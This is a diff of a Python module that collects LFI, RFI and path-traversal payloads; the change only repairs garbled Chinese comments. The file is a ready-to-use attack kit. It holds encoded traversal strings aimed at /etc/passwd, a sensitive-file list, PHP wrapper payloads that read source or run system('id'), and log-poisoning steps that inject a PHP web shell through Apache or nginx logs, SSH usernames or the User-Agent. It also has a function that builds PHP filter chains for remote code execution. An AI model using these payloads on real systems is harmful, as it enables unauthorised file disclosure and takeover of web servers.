@@ -1,32 +1,32 @@
 # -*- coding: utf-8 -*-
-"""LFI / RFI / Path Traversal Payload çæå¨.
+"""LFI / RFI / Path Traversal Payload 生成器.
 
-è¦ç:
-    - æ¬å°æä»¶åå« (LFI)
-    - è¿ç¨æä»¶åå« (RFI)
-    - è·¯å¾éå (Path Traversal)
-    - PHP ä¼ªåè®® (php:// filter/wrapper/data/input)
-    - æ¥å¿æ±¡æ
-    - /proc/self/environ ç­æå·§
+覆盖:
+    - 本地文件包含 (LFI)
+    - 远程文件包含 (RFI)
+    - 路径遍历 (Path Traversal)
+    - PHP 伪协议 (php:// filter/wrapper/data/input)
+    - 日志污染
+    - /proc/self/environ 等技巧
 """
 from typing import List, Dict
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  è·¯å¾éå Payload
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  路径遍历 Payload
+# ═══════════════════════════════════════════════════════════
 
 PATH_TRAVERSAL: List[str] = [
     "../../../etc/passwd",
     "....//....//....//etc/passwd",
-    "..%2f..%2f..%2fetc/passwd",          # URL ç¼ç 
-    "..%252f..%252f..%252fetc/passwd",    # å URL ç¼ç 
+    "..%2f..%2f..%2fetc/passwd",          # URL 编码
+    "..%252f..%252f..%252fetc/passwd",    # 双 URL 编码
     "..\\/..\\/..\\/etc/passwd",
     "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
     "..;/..;/..;/etc/passwd",
     "....\\/....\\/....\\/etc/passwd",
-    "..%c0%af..%c0%af..%c0%afetc/passwd", # å®½å­è
-    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Unicode å¨è§ææ 
+    "..%c0%af..%c0%af..%c0%afetc/passwd", # 宽字节
+    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Unicode 全角斜杠
 ]
 
 WINDOWS_PATH_TRAVERSAL: List[str] = [
@@ -38,9 +38,9 @@ WINDOWS_PATH_TRAVERSAL: List[str] = [
 ]
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  å¸¸è§æææä»¶
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  常见敏感文件
+# ═══════════════════════════════════════════════════════════
 
 SENSITIVE_FILES: Dict[str, List[str]] = {
     "Linux": [
@@ -71,48 +71,48 @@ SENSITIVE_FILES: Dict[str, List[str]] = {
 }
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  PHP ä¼ªåè®®
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  PHP 伪协议
+# ═══════════════════════════════════════════════════════════
 
 PHP_WRAPPERS: Dict[str, List[Dict[str, str]]] = {
-    "æä»¶è¯»å": [
+    "文件读取": [
         {
-            "name": "php://filter (è¯»åæºç )",
+            "name": "php://filter (读取源码)",
             "payload": "php://filter/convert.base64-encode/resource=index.php",
         },
         {
-            "name": "php://filter (æ  base64 å¹²æ°)",
+            "name": "php://filter (无 base64 干扰)",
             "payload": "php://filter/read=convert.base64-encode/resource=index.php",
         },
         {
-            "name": "php://filter + å¤§å°åç»è¿",
+            "name": "php://filter + 大小写绕过",
             "payload": "php://FilTer/convert.base64-encode/resource=index.php",
         },
         {
-            "name": "php://filter + åéç¼ç ",
+            "name": "php://filter + 双重编码",
             "payload": "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php",
         },
         {
-            "name": "php://filter + å­ç¬¦ä¸²å¤çé¾",
+            "name": "php://filter + 字符串处理链",
             "payload": "php://filter/string.rot13/resource=index.php",
         },
         {
-            "name": "php://filter åç¼©é¾",
+            "name": "php://filter 压缩链",
             "payload": "php://filter/zlib.deflate/resource=index.php",
         },
         {
-            "name": "file:// åè®®",
+            "name": "file:// 协议",
             "payload": "file:///etc/passwd",
         },
         {
-            "name": "phar:// åè®®",
+            "name": "phar:// 协议",
             "payload": "phar://uploaded_file.jpg/shell.php",
         },
     ],
-    "ä»£ç æ§è¡": [
+    "代码执行": [
         {
-            "name": "data:// (çº¯ææ¬)",
+            "name": "data:// (纯文本)",
             "payload": "data://text/plain,<?php%20system('id');?>",
         },
         {
@@ -125,42 +125,42 @@ PHP_WRAPPERS: Dict[str, List[Dict[str, str]]] = {
             "note": "POST body: <?php system('id');?>",
         },
         {
-            "name": "expect:// (éè¦ pecl)",
+            "name": "expect:// (需要 pecl)",
             "payload": "expect://id",
         },
     ],
-    "æ¥å¿åå« â RCE": [
+    "日志包含 → RCE": [
         {
-            "name": "Apache access.log æ±¡æ",
+            "name": "Apache access.log 污染",
             "payload": "/var/log/apache2/access.log",
-            "note": "ååéå¸¦ <?php system($_GET[c]);?> çè¯·æ±, ååå«æ¥å¿æä»¶",
+            "note": "先发送带 <?php system($_GET[c]);?> 的请求, 再包含日志文件",
         },
         {
-            "name": "nginx access.log æ±¡æ",
+            "name": "nginx access.log 污染",
             "payload": "/var/log/nginx/access.log",
         },
         {
             "name": "/proc/self/environ (CGI)",
             "payload": "/proc/self/environ",
-            "note": "å¨ User-Agent ä¸­æ³¨å¥ PHP ä»£ç ",
+            "note": "在 User-Agent 中注入 PHP 代码",
         },
         {
-            "name": "SSH auth.log æ±¡æ",
+            "name": "SSH auth.log 污染",
             "payload": "/var/log/auth.log",
-            "note": "ç¨ ssh '<?php system($_GET[c]);?>'@target æ±¡ææ¥å¿",
+            "note": "用 ssh '<?php system($_GET[c]);?>'@target 污染日志",
         },
     ],
 }
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
 #  PHP Filter Chain (php_filter_chain_generator style)
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
 
 def generate_filter_chain(command: str, base: str = "index.php") -> str:
-    """çæ PHP filter chain ç¨äº RCE.
+    """生成 PHP filter chain 用于 RCE.
 
-    æ³¨æ: è¿æ¯ç¤ºæçæ¬ãå®æ´çéè¦ PHP ä»£ç éå filter chain generator å·¥å·ã
+    注意: 这是示意版本。完整版需要 PHP 代码配合 filter chain generator 工具。
     """
     php_code = f"<?php system('{command}');?>"
     encoded = php_code.encode().hex()
@@ -172,24 +172,24 @@ def generate_filter_chain(command: str, base: str = "index.php") -> str:
 
 
 def get_path_traversal() -> List[str]:
-    """è·åè·¯å¾éå Payload åè¡¨."""
+    """获取路径遍历 Payload 列表."""
     return PATH_TRAVERSAL
 
 
 def get_windows_paths() -> List[str]:
-    """è·å Windows è·¯å¾éå Payload."""
+    """获取 Windows 路径遍历 Payload."""
     return WINDOWS_PATH_TRAVERSAL
 
 
 def get_sensitive_files(os_type: str = "") -> dict:
-    """è·åå¸¸è§æææä»¶åè¡¨."""
+    """获取常见敏感文件列表."""
     if os_type and os_type.capitalize() in SENSITIVE_FILES:
         return {os_type.capitalize(): SENSITIVE_FILES[os_type.capitalize()]}
     return SENSITIVE_FILES
 
 
 def get_php_wrappers(category: str = "") -> dict:
-    """è·å PHP ä¼ªåè®® Payload."""
+    """获取 PHP 伪协议 Payload."""
     if category and category in PHP_WRAPPERS:
         return {category: PHP_WRAPPERS[category]}
     return PHP_WRAPPERS
